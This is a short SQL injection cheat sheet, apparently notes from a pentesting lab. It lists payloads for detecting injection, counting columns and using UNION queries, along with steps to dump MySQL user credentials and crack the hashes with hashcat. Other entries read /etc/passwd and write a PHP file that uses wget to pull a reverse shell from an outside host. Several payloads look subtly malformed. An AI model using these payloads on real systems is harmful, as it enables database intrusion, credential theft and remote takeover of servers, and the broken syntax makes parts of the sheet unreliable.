## Find sql injection
```
a' SLEEP(5)
a SLEEP(5)
```

## Find number of columns
```
a GROUP BY 5
```

## Use UNION to inject columns
```
999 UNION 1,2,3,4,5
```

## Get DB info
```
SELECT @@version
```

## Get mysql user details
```
SELECT GROUP_CONCAT(host,user,password) FROM mysql.user
```
### If you found mysql hash use hashcat to crack the password
```
hashcat -m 300 mysql-user.hash /usr/share/wordlists/rockyou.txt
```

### If phpmyadmin is running login using found credentials

## Use sqli to read /etc/passwd
```
LOAD_ FILE('/etc/passwd')
```

## Getting shell using sqli
```
select '<?php exec(\"wget -O /var/www/html/shell.php http://10.10.14.12:5555/php-reverse-shell.php\");?>'),3,4,5,6,7 INTO OUTFILE '/var/www/html/test4.php
```

